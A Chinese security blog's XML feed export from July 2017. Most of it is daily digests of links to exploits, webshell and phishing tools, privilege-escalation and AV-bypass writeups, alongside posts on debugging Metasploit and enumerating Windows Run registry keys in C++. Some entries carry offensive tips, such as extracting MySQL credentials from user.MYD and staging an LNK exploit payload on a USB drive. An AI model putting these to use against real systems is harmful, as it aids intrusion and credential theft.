内网传播分析&#x68;&#x74;&#x74;&#112;&#x3a;&#47;&#47;&#x70;&#117;&#x72;&#112;&#x6c;&#101;&#114;&#111;&#99;&#46;&#x63;&#111;&#109;&#47;&#77;&#x44;&#47;&#50;&#48;&#x31;&#x37;&#45;&#x30;&#x36;&#x2d;&#x32;&#56;&#x40;&#x48;&#111;&#x77;&#37;&#x32;&#x30;&#x64;&#111;&#101;&#x73;&#x25;&#x32;&#48;&#80;&#x65;&#x74;&#121;&#97;&#37;&#x32;&#x30;&#x73;&#x70;&#x72;&#x65;&#x61;&#100;&#x25;&#50;&#x30;&#105;&#x6e;&#x25;&#50;&#48;&#76;&#65;&#78;&#46;&#x68;&#x74;&#109;&#108; PROFTPD-1.3.3C后门分析http://whereisk0shl.top/post/proftpd-1.3.3chou-men-fen-xi BurpSuite插件：利用BurpSuite Spider收集子域名和相似域名http://www.polaris-lab.com/index.php/archives/349/ Skype-Type：一款keyboard acoustic eavesdropping工具https://github.com/SPRITZ-Research-Group/Skype-Type 1通过键盘敲击声来进行键盘监听？ Brida:使用Frida进行移动应用渗透测试https://techblog.mediaservice.net/2017/07/brida-advanced-mobile-application-penetration-testing-with-frida/ 看我如何用20行代码做日志分析https://www.secpulse.com/archives/59608.html XSStrike：基于Python的XSS测试工具http://www.freebuf.com/sectool/142044.html Android安全几道入门题目http://www.freebuf.com/articles/terminal/139451.html sniper：一个开源的 Linux 下基于终端的 Webshell 利用与管理工具http://www.freebuf.com/column/142371.html 攻击者侵入系统后如何提升账户权限：提权技术详细分析http://www.freebuf.com/news/141335.html 1这里只是介绍了使用metasploit对windows进行提权的两种方法，还是很不多的 sThisLegit、Phinn：新型开源钓鱼工具https://github.com/duo-labs/isthislegit Man-in-the-middle wireless access point inside a docker container 造公共 WiFi 网络执行中间人攻击的 Docker 容器https://github.com/brannondorsey/mitm-router 手把手教大家爬取js动态生成的页面http://www.freebuf.com/column/142404.html 1其实就是利用的selenium I2C 协议的逆向分析：https://xianzhi.aliyun.com/forum/read/1910.html Blackhat兵器谱新添IOT安全武器http://www.freebuf.com/column/142421.html 一个钓鱼木马的分析 （一）http://www.freebuf.com/column/142406.html blackhat之 A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!http://blog.innerht.ml/testing-new-features/ Web端口复用正向后门研究实现与防御https://mp.weixin.qq.com/s?__biz=MzI0NjAyMjU4MA==&amp;mid=2649581381&amp;idx=1&amp;sn=dc46777ca1d69a7c8812deddb52233f0&amp;chksm=f15c6f9ec62be688e547b16f6e160b88a97d86968910cede837aba314b72f566557c149c1198&amp;mpshare=1&amp;scene=23&amp;srcid=073193eNCCy3uo3M2VvkVxO1#rd Friday the 13th: JSON Attacks介绍针对 JSON serializers 和 .NET serializers 的攻击https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf 测试驱动文档在后端 API 开发中的实践https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&amp;mid=2247483941&amp;idx=1&amp;sn=be3842f417f57f3e97b31a6c66aca60f&amp;chksm=96f41d48a183945ef7598593828ebbedf5759875b0847b6c0b316f32af8df014e09ed31f61df&amp;mpshare=1&amp;scene=23&amp;srcid=0731iAGUMovgmQCMlr3OJI9g## 如何使用Fuzzing挖掘ImageMagick的漏洞https://github.com/lcatro/Fuzzing-ImageMagick/blob/master/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Fuzzing%E6%8C%96%E6%8E%98ImageMagick%E7%9A%84%E6%BC%8F%E6%B4%9E.md 1目测又是一个全栈牛 mysql注入可报错时爆表名、字段名、库名http://www.wupco.cn/?p=4117 1注入技巧 sRDI - 用 Shellcode 实现的 DLL 反射注入。可以将指定 DLL 文件转换成 Shellcode 输出：https://github.com/monoxgas/sRDI Revoke-Obfuscation - PowerShell 代码的混淆也开始出现了，来自 FireEye 在 BlackHat 会议的演讲https://www.fireeye.com/blog/threat-research/2017/07/revoke-obfuscation-powershell.htmlhttps://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf 详述MSSQL服务在渗透测试中的利用http://www.freebuf.com/column/142307.html 搜狗可以搜索微信的文章,这个也是信息搜集的一个手段。http://weixin.sogou.com/ 元数据：黑客最好的朋友http://bobao.360.cn/learning/detail/4161.htmlhttp://bobao.360.cn/learning/detail/4162.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170728安全动态]]></title>
    <url>%2F2017%2F07%2F28%2F20170728%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 intellij idea远程调试jenkinshttp://blog.nsfocus.net/intellij-idea-remote-debugging-jenkins/ 1之前想debug jenkins的，后来有事儿耽搁了，这周看看，对java感兴趣的赶紧操作起来 CVE-2017-8464：LNK Remote Code Execution Vulnerability，Python exphttps://github.com/nixawk/labs/blob/master/CVE-2017-8464/exploit_CVE-2017-8464.py 色情广告挂马分析：记一次挂马与挖矿之间的“亲密接触”http://www.freebuf.com/news/141589.html 测试如何用图表累计统计linux服务器的性能监控信息http://blog.nsfocus.net/test-performance-monitoring-information-linux-server-charts/ 1做运维的朋友可以关注下 一款短小精致的SSH后门分析http://www.freebuf.com/articles/system/140880.html Headless Chrome略知一二http://blog.nsfocus.net/headless-chrome/ 1之前还有一篇文章介绍这个的，可以结合着看 SSRF 利用的新角度 - 攻击流行编程语言的 URL Parsers，来自 BlackHat 会议https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf 你还在关注勒索病毒？别人已经转行挖矿！http://www.freebuf.com/news/141004.html 攻击商业电子邮件时是如何通过 HTML 附件进行网络钓鱼的http://blog.trendmicro.com/trendlabs-security-intelligence/html-attachments-phishing-used-bec-attacks/ 对勒索软件受害用户支付行为的检测，来自 Googlehttps://cdn.elie.net/talks/tracking-desktop-ransomware-payments-end-to-end-slides.pdf Awesome Web Securityhttps://github.com/qazbnm456/awesome-web-security Web cache deception Attackhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack-wp.pdf CLR-Injectionhttps://github.com/3gstudent/CLR-Injection 攻击用户Docker容器隐藏、权限维持、植入恶意软件https://threatpost.com/attack-uses-docker-containers-to-hide-persist-plant-malware/126992/ 阿里云安骑士 webshell规则逆向https://mp.weixin.qq.com/s?__biz=MzI4NjYwMTQ1Ng==&amp;mid=2247483697&amp;idx=1&amp;sn=f36f1420fe39f51ca648e1de5b5431b2 腾讯云 webshell检测规则逆向https://mp.weixin.qq.com/s?__biz=MzI4NjYwMTQ1Ng==&amp;mid=2247483708&amp;idx=1&amp;sn=e8548a85d75584cc93fd2379f591c634 Docker Security最佳实践电子书https://www.sqreen.io/resources/docker-security-best-practices 看雪CTF2017学习记录整理系列5https://weiyiling.cn/one/pediy_ctf2017-5 php session机制http://blog.nsfocus.net/php-session-mechanism/ MSDN，itellyouhttp://www.itellyou.cn/ 1用来下载系统镜像的网站 小记录今天拷贝ubuntu虚拟机，发现网络死活配不对，最后发现原来是图形界面的网络进行了ip的配置，怪不得一直命令行配不对，😓，思路还得灵活啊]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170727安全动态]]></title>
    <url>%2F2017%2F07%2F27%2F20170727%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 FireEye 公开了一个用于恶意代码分析的 Windows 定制虚拟机 - FLARE VMhttps://www.fireeye.com/blog/threat-research/2017/07/flare-vm-the-windows-malware.html 绕过杀毒软件与主机入侵防御系统对流量的检测https://pentestlab.blog/2017/07/26/bypassing-antivirus-host-intrusion-prevention-systems/ BinaryAlert - 一个含有实时追溯等特性的恶意软件检测工具https://medium.com/airbnb-engineering/binaryalert-real-time-serverless-malware-detection-ca44370c1b90 Shadowsocks原理详解https://mp.weixin.qq.com/s/5D0Zoz2jq9s7oGyzfSorMA 如何使用ldapsearch来dump域中的LAPS密码http://bobao.360.cn/learning/detail/4151.html 域渗透之Exchange Serverhttp://bobao.360.cn/learning/detail/4145.html 一个利用“永恒之蓝”漏洞传播的挖矿程序分析http://www.freebuf.com/news/141011.html SSD Advisory – Supervisor Authenticated Remote Code Executionhttps://blogs.securiteam.com/index.php/archives/3348 nps_payload - 利用各种来源的公开技术，生成绕过基础入侵检测的 Payloadshttps://github.com/trustedsec/nps_payload 2017-NSCTF-PWNhttps://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484473&amp;idx=1&amp;sn=92ebb380124fa3451777b17d62660631&amp;chksm=ec1e3411db69bd0729228043f3caf38089392455edfb0b858074161bc48e1934edc418448f84&amp;scene=0&amp;key=58e45431df36b4fb27bd5de7a94bb0b571d3e10cdffd8290711b39f605430fcded3fbadcd8ecaf963d429e31809e46e06b5b41960d182d610032ef61934937e9316472ed7595811769aa24091317ddc5&amp;ascene=0&amp;uin=NzQxNDQ1&amp;devicetype=iMac+MacBookPro11%2C3+OSX+OSX+10.12.5+build(16F73)&amp;version=12020810&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=NjiCM%2F5tefRAismalpcTl8Ak%2By8OO3uIz%2FRR%2BlubRNw%3D 1周末学习一下 WSSAT - Web 服务安全评估工具http://www.kitploit.com/2017/07/wssat-web-service-security-assessment.html DefCON 上将会公布一个 Windows SMB 内存耗尽拒绝服务0Day，不会蓝屏，连蓝屏需要的内存也不够了，需要建立大量连接http://threatpost.com/windows-smb-zero-day-to-be-disclosed-during-def-con/126927/ ESET 在 GitHub 上分享的对一些样本逆向分析的辅助代码https://github.com/eset/malware-research Awesome Vulnerability Research - 漏洞研究方面的资料整理https://github.com/re-pronin/Awesome-Vulnerability-Research Proxy Re-Encryption Playground in Pythonhttps://hackernoon.com/proxy-re-encryption-playground-in-python-3bc66170b9bf 通过AI和Python生成密https://github.com/k3170makan/PyMLProjects/blob/master/passwords/README.md IaaS、PaaS、SaaS三者的比较http://www.engineyard.com/blog/the-differences-between-iaas-paas-and-saas-and-when-to-use-each Empire without PowerShell.exe（Empire：一款后渗透框架）https://bneg.io/2017/07/26/empire-without-powershell-exe/ Tomcat Security Constraint Bypass CVE-2017-5664 分析https://mp.weixin.qq.com/s/AWXjwO03oxrL960l3WxyCQ SQLite手工注入Getshell技巧http://fuping.site/2017/07/19/SQLite-Injection-Get-WebShell/ ubuntu安装metasploit123curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \ chmod 755 msfinstall &amp;&amp; \ ./msfinstall]]></content>
  </entry>
  <entry>
    <title><![CDATA[metasploit调试以及ruby入门踩坑]]></title>
    <url>%2F2017%2F07%2F26%2Fmetasploit%E8%B0%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[记录下踩的坑吧 前言Ruby是什么，gem又是什么，Ruby on Rails又是什么，之前只是知道Ruby是一门面向对象的脚本语言，gem是有一个ruby的包管理器，好比是python的pip以及nodejs的NPM，而Ruby on Rails是一个使用Ruby语言写的开源Web应用框架，它是严格按照MVC结构开发的。它努力使自身保持简单，来使实际的应用开发时的代码更少，使用最少的配置。(据说Twitter就是用的这个框架) Gem使用Gem 是一个管理 Ruby 库和程序的标准包。Ruby gem 包的安装方式：所有的 gem 包，会被安装到 /[Ruby root]/lib/ruby/gems/[ver]/ 目录下，这其中包括了 Cache、doc、gems、specifications 等目录，cache 下放置下载的原生 gem 包，gems 下则放置的是解压过的 gem 包。12 M0rk@hhh  ~/.rvm/rubies/ruby-2.3.0/lib/ruby/gems/2.3.0  lsbin build_info cache doc environment extensions gems specifications wrappers 当安装过程中遇到问题时，可以进入这些目录，手动删除有问题的 gem 包，然后重新运行 gem install [gemname] 命令即可。Ruby Gem 命令详解： 12345678910111213141516171819202122232425262728# 更新Gem自身# 注意：在某些linux发行版中为了系统稳定性此命令禁止执行$ gem update --system# 从Gem源安装gem包$ gem install [gemname]# 从本机安装gem包$ gem install -l [gemname].gem# 安装指定版本的gem包$ gem install [gemname] --version=[ver]# 更新所有已安装的gem包$ gem update# 更新指定的gem包# 注意：gem update [gemname]不会升级旧版本的包，此时你可以使用 gem install [gemname] --version=[ver]代替$ gem update [gemname]# 删除指定的gem包，注意此命令将删除所有已安装的版本$ gem uninstall [gemname]# 删除某指定版本gem$ gem uninstall [gemname] --version=[ver]# 查看本机已安装的所有gem包$ gem list [--local] 踩坑开始开始的时候看的是这篇文章https://community.rapid7.com/community/metasploit/blog/2014/03/14/debugging-metasploit-modules-with-pry-debugger但是在安装的时候报错，没有好的解决方法这个时候我发现了这个https://github.com/deivid-rodriguez/byebug感觉应该是相同用途，安装没报错，然后修改rb的时候一直加载不了，这个时候想到自己有安装RubyMine，那就测试个helloworld试试看。测试的没问题，如下图：后来发现，当添加或者修改metasploit的modules的时候，需要使用 reload_all 命令来重新加载所有的模块，但是添加了 require ‘byebug’ 时候还是报错，好像是需要rerun bundle的，rerun的时候又是各种问题，首先ruby版本太低，升级完ruby版本，bundle install的时候没错了，但是运行msfconsole还是失败…完，meatsloit弄坏了，晚上回来， /opt/metasploit-framework/embedded/framework sudo ./msfupdate 升级了一下又能用了，太晚了，明天再看看吧 0727更新：今天又看了下资料，发现byebug还是不能用，搜索metasploit debug的资料也是很老的，但是在Stack Overflow发现了这个https://stackoverflow.com/questions/43882397/debugging-about-the-metasploit-exploit-module就试了一下pry，果然可以和metasploit无缝使用。但是蛋疼的是pry没有step和next这种最基本的单步调试功能。1234require ‘pry’ #需要pry库,否则binding.pry就不认识了g_a = 1g_b = 2binding.pry #运行到这句程序就停下来并打开pry让你调试 随便找个msf的rb脚本，插上上面的代码 pry常用命令： 1234567cd: 这可不是切换目录的，而是切换类。如”cd Article”会进入Article类中，”Article.all”可直接缩写为”all”nesting: cd切来切去如果迷了路，用它可以看当前在哪个类下面。我倒觉得如果名字改为”pwd”会更好。ls: 查看一些信息，ls -h查看帮助，ls -m查看实例方法，ls -M查看类方法，ls -p查看private方法。show-doc Array#in_groups_of：查看文档。show-method -l Array#in_groups_of：查看方法的源代码，-l显示行号。edit-method Array#in_groups_of：调出nano来编辑代码，如果是能调出vim就好啦。(后来发现其实很简单，见后面。)help：显示帮助 rvm 常用命令：1234RVM是Ruby Version Manager的缩写，是一个命令行工具，它可以让你轻松地安装，管理和使用多个版本的Ruby.不同的rails项目使用等ruby和rails版本不一样的时候，可以使用RVM自由切换。1.rvm list 查看所有的ruby版本2.rvm current 查看当前的ruby版本3.rvm --default use 2.x.x 切换到到版本2.x.xs 小结1.pry-debugger在ruby2.0+已不再能使用，所以基本上可以放弃2.pry-byebug 应该是现在在用的，但是我这里bundle install完之后，msfconsole就报错了，暂时问题还没解决，感觉应该是metasploit使用了自带的ruby以及gem的问题3.最终还是选择了没有单步步过功能的pry4.其实python也有这种调试工具，是pdb的模块，感兴趣的可以学习下5.msfconsole居然是一个脚本文件，一开始以为是个二进制程序。。。（当你通过whereis找不到这个文件的时候，就很有可能是个文本文件，find找到，然后file命令看一下）6.metasploit的ruby是自带的，可执行文件在这个目录下 /opt/metasploit-framework/embedded/bin Reference metasploit - debug 使用pry调试程序介绍 pry 如何单步调试ruby代码 乌云文章：Metasploit module开发入门篇]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170726安全动态]]></title>
    <url>%2F2017%2F07%2F26%2F20170726%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 FastNetMon - Debian 官方推出的一个 DDoS 检测工具，基于三个抓包引擎：NetFlow、 IPFIX、 sFLOW，可以通过外部脚本通知用户https://packages.debian.org/sid/fastnetmon JavaScript 反调试和混淆https://0x0d.im/archives/javascript-anti-debug-and-obfuscator.html glibc malloc学习笔记之fastbinhttp://0x48.pw/2017/07/25/0x35/ 一个生成各种进制格式IP的小工具http://www.freebuf.com/sectool/140982.html 通过 WebView 攻击 Android 应用https://zhuanlan.zhihu.com/p/28107901 利用树莓派自制恶意充电宝实验http://bobao.360.cn/learning/detail/4153.html Openresty的开发闭环初探http://www.freebuf.com/company-information/141861.html 使用Windbg分析.NET恶意软件http://bobao.360.cn/learning/detail/4150.html picoCTF Write-up：通过格式化字符串漏洞绕过ASLRhttps://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920 hackerone官博分享如何进行渗透测试前期的信息收集https://www.hackerone.com/blog/how-to-recon-and-content-discovery Open Sourcing JA3：用于恶意软件检测的SSL/TLS客户端指纹识别项目https://engineering.salesforce.com/open-sourcing-ja3-92c9e53c3c41 针对有双因子认证站点的钓鱼手段http://www.openskycorp.com/resource-center/blog/phishing-way-past-multi-factor-authentication/ 探索基于语音的身份认证系统命令注入https://www.youtube.com/playlist?list=PLl6DAJhNeWAmOcGC38tLlFGdevLniiUmG 一道简单内核题入门内核利用http://bobao.360.cn/learning/detail/4148.html Metasploit 中新添加了针对 Windows 快捷方式 (.LNK) 代码执行漏洞（CVE-2017-8464）的利用代码https://github.com/rapid7/metasploit-framework/pull/8767 1234注：在测试的时候，要把恶意payload放在优盘的根目录下更多信息：https://github.com/rapid7/metasploit-framework/tree/7ce813ae6e11f0336f51dc878e1aa40af6eabf9c/data/exploits/cve-2017-8464/srcpython 工具：https://www.exploit-db.com/exploits/42429/ Windows 内核漏洞学习—空指针解引用http://www.freebuf.com/vuls/143575.html Metadata - 黑客的朋友，基础信息泄露的源头https://blog.sweepatic.com/metadata-hackers-best-friend/ Java代码审计连载http://www.freebuf.com/column/143595.html 使用 LDAPSEARCH 导出 LAPS 明文密码https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/ macOS 安全和隐私指南https://github.com/drduh/macOS-Security-and-Privacy-Guide Forcepoint 发现 URSNIF 变种通过收集鼠标移动轨迹判断是否处于沙盒以绕过查杀https://blogs.forcepoint.com/security-labs/ursnif-variant-found-using-mouse-movement-decryption-and-evasion 在oh-my-zsh中粉红是软连接、红色是可执行文件、蓝色是文件夹、白色是其它(比如压缩文件、图片、文本文件啥的，好像不同的shell规则也不一样，而且应该是可以修改的) chrome打开https网站的时候有时候会出现 您的连接不是私密连接 红色提示，导致我们打不开网站1这个是由于网站设置了HSTS的原因，HSTS是HTTP Strict Transport Security的缩写，即：“HTTP严格传输安全”。HSTS可以很大程度上解决SSL剥离攻击，因为只要浏览器曾经与服务器创建过一次安全连接，之后浏览器会强制使用HTTPS，即使链接被换成了HTTP。]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170725安全动态]]></title>
    <url>%2F2017%2F07%2F25%2F20170725%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 一个机器学习社区http://paper.kakapo.ml/ The ThreatHunter Playbook - 专注威胁检测一个 GitHub 项目https://github.com/Cyb3rWard0g/ThreatHunter-Playbook 精选 HackerOne 这一年 6 个有趣的安全漏洞http://paper.seebug.org/358/ 目标信息信息搜集的一个工具https://github.com/UltimateHackers/ReconDog 获取来源IP地址的正确姿势http://www.freebuf.com/articles/web/140669.html Web Sight社区版 – 企业攻击面枚举工具https://l.avala.mp/?p=209 Little Trick 1在渗透测试过程中，如果能够拿到mysql目录下的user.MYD文件，这个时候使用十六进制编辑工具，可以获取到mysql用户的账号和密码，然后去相关网站解密就可以了。 二进制师傅们的博客http://wangzhixian.org/%E5%90%84%E4%BD%8D%E5%B8%88%E5%82%85%E7%9A%84%E5%8D%9A%E5%AE%A2 没有绝对安全的系统：写在AES 256破解之后http://www.freebuf.com/column/141603.html 信任问题：利用TrustZone TEE 1project zero 出品，还没看懂:( Bright City: 针对国外一款市政相关APP的安全性分析https://randywestergren.com/bright-city-highly-insecure-police-municipal-government-app/ 一款基于PHP的漏洞扫描器https://github.com/dermotblair/webvulscan 旧瓶新酒之ngx_lua &amp; fail2ban实现主动诱捕https://www.secpulse.com/archives/59444.html Flash漏洞利用之“喜闻乐见”http://www.freebuf.com/vuls/141405.html 无线键盘易被监听，不知不觉导致信息泄露http://www.freebuf.com/geek/140951.html 逆向入门学习——看雪CTF2017第3题 爱琴海CrackMe bailianmen2017-07-25 首发专栏：百炼门关注http://www.freebuf.com/column/141147.html HTTPS真的就是安全的象征吗？HTTPS检查工具带来的安全威胁http://www.freebuf.com/news/136565.html 查看windows management framework 以及ps版本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849更新之前 PS C:\Users\Brian&gt; $PSVersionTableName Value---- -----CLRVersion 2.0.50727.5485BuildVersion 6.1.7601.17514PSVersion 2.0WSManStackVersion 2.0PSCompatibleVersions &#123;1.0, 2.0&#125;SerializationVersion 1.1.0.1PSRemotingProtocolVersion 2.1PS C:\Users\Brian&gt; $PSVersionTable.WSManStackVersion.Major2PS C:\Users\Brian&gt;更新之后：PS C:\Users\chq&gt; $PSVersionTableName Value---- -----PSVersion 5.0.10586.117PSCompatibleVersions &#123;1.0, 2.0, 3.0, 4.0...&#125;BuildVersion 10.0.10586.117CLRVersion 4.0.30319.42000WSManStackVersion 3.0PSRemotingProtocolVersion 2.3SerializationVersion 1.1.0.1PS C:\Users\chq&gt;下面是mac版的powershell：PS /usr/share&gt; $PSVersionTable Name Value ---- ----- PSVersion 6.0.0-beta PSEdition Core GitCommitId v6.0.0-beta.3 OS Darwin 16.6.0 Darwin Kernel Version 16.6.0: Fri Apr 14 16:21:16 PDT 2017; root:xnu-3789.60.24~6/RELEASE_X86_64 Platform Unix PSCompatibleVersions &#123;1.0, 2.0, 3.0, 4.0...&#125; PSRemotingProtocolVersion 2.3 SerializationVersion 1.1.0.1 WSManStackVersion 3.0 PS /usr/share&gt; 新版powershell 支持多种文件hash校验 12Get-FileHash C:\Windows\notepad.exe -Algorithm MD5| Format-ListGet-FileHash C:\Windows\notepad.exe -Algorithm SHA1| Format-List linux中usr/local下一般是你安装软件的目录，这个目录就相当于在windows下的programefiles这个目录 /opt这个目录是一些大型软件的安装目录，或者是一些服务程序的安装目录]]></content>
  </entry>
  <entry>
    <title><![CDATA[windows注册表]]></title>
    <url>%2F2017%2F07%2F24%2Fwindows%E6%B3%A8%E5%86%8C%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[前言&nbsp;&nbsp;&nbsp;&nbsp;注册表是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息。早在Windows 3.0推出OLE技术的时候，注册表就已经出现。随后推出的Windows NT是第一个从系统级别广泛使用注册表的操作系统。但是，从Windows 95开始，注册表才真正成为Windows用户经常接触的内容，并在其后的操作系统中继续沿用至今。由于注册表的功能非常强大，因此注册表对于病毒、木马来说是非常有利用价值的，而对于反病毒软件来说，注册表也是它需要加强守卫的地方，可以说，注册表是一个正义与邪恶的必争之地。恶意程序在注册表中常见的操作有修改文件关联、增加系统启动项、映像劫持、篡改浏览器主页等。数据结构:&nbsp;&nbsp;&nbsp;&nbsp;注册表由键（key，或称“项”）、子键（subkey，子项）和值项（value）构成。一个键就是树状数据结构中的一个节点，而子键就是这个节点的子节点，子键也是键。一个值项则是一个键的一条属性，由名称（name）、数据类型（datatype）以及数据（data）组成。一个键可以有一个或多个值，每个值的名称各不相同，如果一个值的名称为空，则该值为该键的默认值。数据类型:注册表的数据类型主要有以下五种： 显示类型 数据类型 说明 REG_SZ 字符串 文本字串 REG_BINARY 二进制数 不定长度的二进制值，以十六进制显示 REG_DWORD 双字 一个 32 位的二进制值，显示为 8 位的十六进制值 REG_MULTI_SZ 多字符串 含有多个文本值的字符串，此名来源于字符串间用 nul 分隔、结尾两个 nul REG_EXPAND_SZ 可扩充字符串 含有环境变量的字符串 注册表的分支结构:注册表有五个一级分支，下面是这五个分支的名称及作用： 名称 作用 HKEY_CLASSES_ROOT 存储Windows可识别的文件类型的详细列表，以及相关联的程序。 HKEY_CURRENT_USER 存储当前用户设置的信息。 HKEY_LOCAL_MACHINE 包括安装在计算机上的硬件和软件的信息。 HKEY_USERS 包含使用计算机的用户的信息。 HKEY_CURRENT_CONFIG 这个分支包含计算机当前的硬件配置信息。 通过注册表获取开机启动项原理: 通过枚举注册表中的 “HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\“子键下的键值项,取得跟随windows启动而启动的程序。 主要代码如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143VOID CManageRunDlg::InitRunList()&#123; // 设置扩展样式 m_RunList.SetExtendedStyle( m_RunList.GetExtendedStyle() | LVS_EX_GRIDLINES // 有网格 | LVS_EX_FULLROWSELECT); // 选择单行 // 在ListCtrl中插入新列 m_RunList.InsertColumn(0, &quot;NO.&quot;); m_RunList.InsertColumn(1, &quot;键值名称&quot;); m_RunList.InsertColumn(2, &quot;键 值&quot;); /* LVSCW_AUTOSIZE_USEHEADER: 列的宽度自动匹配为标题文本 如果这个值用在最后一列，列宽被设置为ListCtrl剩余的长度 */ m_RunList.SetColumnWidth(0, LVSCW_AUTOSIZE_USEHEADER); m_RunList.SetColumnWidth(1, LVSCW_AUTOSIZE_USEHEADER); m_RunList.SetColumnWidth(2, LVSCW_AUTOSIZE_USEHEADER);&#125;#define REG_RUN &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run\\&quot;VOID CManageRunDlg::ShowRunList()&#123; // 清空ListCtrl中的所有项 m_RunList.DeleteAllItems(); DWORD dwType = 0; DWORD dwBufferSize = MAXBYTE; DWORD dwKeySize = MAXBYTE; char szValueName[MAXBYTE] = &#123; 0 &#125;; char szValueKey[MAXBYTE] = &#123; 0 &#125;; HKEY hKey = NULL; LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, REG_RUN, 0, KEY_ALL_ACCESS, &amp;hKey); if ( lRet != ERROR_SUCCESS ) &#123; return ; &#125; int i = 0; CString strTmp; while ( TRUE ) &#123; // 枚举键项 lRet = RegEnumValue(hKey, i, szValueName, &amp;dwBufferSize, NULL, &amp;dwType, (unsigned char *)szValueKey, &amp;dwKeySize); // 没有则退出循环 if ( lRet == ERROR_NO_MORE_ITEMS ) &#123; break; &#125; // 显示到列表控件中 strTmp.Format(&quot;%d&quot;, i); m_RunList.InsertItem(i, strTmp); m_RunList.SetItemText(i, 1, szValueName); m_RunList.SetItemText(i, 2, szValueKey); ZeroMemory(szValueKey, MAXBYTE); ZeroMemory(szValueName, MAXBYTE); dwBufferSize = MAXBYTE; dwKeySize = MAXBYTE; i ++; &#125; RegCloseKey(hKey);&#125;void CManageRunDlg::OnBtnAdd() &#123; // TODO: Add your control notification handler code here CRegAdd RegAdd; RegAdd.DoModal(); // 判断输入是否完整 if ( strlen(RegAdd.m_szKeyName) &gt; 0 &amp;&amp; strlen(RegAdd.m_szKeyValue) &gt; 0) &#123; HKEY hKey = NULL; LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, REG_RUN, 0, KEY_ALL_ACCESS, &amp;hKey); if ( lRet != ERROR_SUCCESS ) &#123; return ; &#125; RegSetValueEx(hKey, RegAdd.m_szKeyName, 0, REG_SZ, (const unsigned char*)RegAdd.m_szKeyValue, strlen(RegAdd.m_szKeyValue) + sizeof(char)); RegCloseKey(hKey); ShowRunList(); &#125; else &#123; AfxMessageBox(&quot;请输入完整的内容&quot;); &#125;&#125;void CManageRunDlg::OnBtnDel() &#123; // TODO: Add your control notification handler code here POSITION pos = m_RunList.GetFirstSelectedItemPosition(); int nSelected = -1; while ( pos ) &#123; nSelected = m_RunList.GetNextSelectedItem(pos); &#125; if ( -1 == nSelected ) &#123; AfxMessageBox(&quot;请选择要删除的启动项&quot;); return ; &#125; char szKeyName[MAXBYTE] = &#123; 0 &#125;; m_RunList.GetItemText(nSelected, 1, szKeyName, MAXBYTE); HKEY hKey = NULL; LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, REG_RUN, 0, KEY_ALL_ACCESS, &amp;hKey); RegDeleteValue(hKey, szKeyName); RegCloseKey(hKey); ShowRunList();&#125; Reference 注册表 https://www.wikiwand.com/zh-hans/%E6%B3%A8%E5%86%8C%E8%A1%A8]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170724安全动态]]></title>
    <url>%2F2017%2F07%2F24%2F20170724%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 2017黑帽大会兵工厂工具列表http://www.freebuf.com/column/141333.html Centos 6/Centos 7/Debian单网卡绑定多个IP的方法https://www.moerats.com/archives/217/ Cisco_WebEx_Browser_Extension_RCE漏洞(CVE–2017–6753)分析https://cert.360.cn/detailbug.html?id=cd916704c2f95860e806fd60202c1d6b powershell 通过IE下载文件https://evi1cg.me/archives/Downloader_byIE.html Vmware虚拟机逃逸漏洞（CVE-2017-4901）Exploit代码分析与利用http://www.freebuf.com/news/141442.html 基于 Neo4j 的 Windows 日志可视化分析https://haveyousecured.blogspot.ca/2017/07/visualize-windows-logs-with-neo4j.html 1这个好像不错，mark 多种 DLL 注入技术原理介绍http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/ 在Android N上对Java方法做hook遇到的坑http://rk700.github.io/2017/06/30/hook-on-android-n/ 利用 COM 对象 Excel.Application 的 RegisterXLL() 方法加载并执行 DLLhttps://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52 我是如何利用 Paypal 服务器的任意文件上传漏洞远程执行代码的http://blog.pentestbegins.com/2017/07/21/hacking-into-paypal-server-remote-code-execution-2017/ 路由器固件安全分析技术（二）https://www.vulbox.com/knowledge/detail/?id=42 BadUSB防御初探http://www.freebuf.com/articles/terminal/140619.html CentOS安装aria2 